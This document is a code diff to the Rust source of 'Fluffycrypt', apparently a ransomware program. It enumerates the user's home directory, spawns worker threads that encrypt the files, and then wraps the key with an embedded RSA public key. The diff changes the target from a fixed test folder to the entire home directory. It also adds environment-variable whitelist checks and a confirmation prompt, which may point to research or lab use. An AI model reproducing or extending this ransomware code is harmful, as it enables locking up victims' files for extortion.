@@ -1,7 +1,9 @@
 use comms::{generate_ucid, Message};
 use filesystem::recurse_directory_with_channel;
 use openssl::rsa;
-use std::path::PathBuf;
+use std::env;
+use std::io;
+use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
@@ -29,31 +31,81 @@ const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");
 
 #[tokio::main]
 async fn main() {
+    let mut disable_cryptography = false;
     let mut builder = Subscriber::builder();
+    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
+        builder = builder.with_max_level(Level::DEBUG);
+    }
     builder = builder.with_thread_ids(true);
     let subscriber = builder.finish();
     tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
     event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
 
+    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
+        event!(
+            Level::WARN,
+            "This host is a development environment, cryptographic operations will not be performed!"
+        );
+        disable_cryptography = true;
+    }
+
+    if Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_DEV")
+        && Ok(String::from("TRUE")) != env::var("FLUFFYCRYPT_ALLOW_TARGET")
+    {
+        // if not development and not allowed
+        event!(
+            Level::ERROR,
+            "This host has not been whitelisted. Fluffycrypt will now exit!"
+        );
+        exit(1);
+    } else if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV")
+        && Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_ALLOW_TARGET")
+    {
+        // if development and allowed
+        event!(
+            Level::WARN,
+            "This host has been whitelisted and has noted itself as a development system. Cryptographic operations have been re-enabled."
+        );
+        disable_cryptography = false;
+    }
+
+    if !disable_cryptography {
+        println!("Are you sure you'd like to nuke this system? ");
+        let mut input = String::new();
+        io::stdin().read_line(&mut input).unwrap();
+
+        if input.to_lowercase() != String::from("yes") {
+            disable_cryptography = true;
+            event!(
+                Level::WARN,
+                "Cryptography disabled per user input. System will still perform all stages except the encryption stage."
+            );
+        }
+    }
+
     let mut key = encryptor::generate_key();
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
-    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
+    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
 
-    let mut threads = Vec::new();
+    if !disable_cryptography {
+        let mut threads = Vec::new();
 
-    event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
-    for _ in 0..THREADS {
-        let thread_reciever = r.clone();
-        let thread_key = key.clone();
-        threads.push(tokio::spawn(async move {
-            encryptor::encrypt_files(thread_reciever, thread_key).await;
-        }));
-    }
+        event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
+        for _ in 0..THREADS {
+            let thread_reciever = r.clone();
+            let thread_key = key.clone();
+            threads.push(tokio::spawn(async move {
+                encryptor::encrypt_files(thread_reciever, thread_key).await;
+            }));
+        }
 
-    for thread in threads {
-        let _ = thread.await;
+        for thread in threads {
+            let _ = thread.await;
+        }
+    } else {
+        event!(Level::INFO, "-- SKIPPED STAGE: Worker Start --");
     }
 
     event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
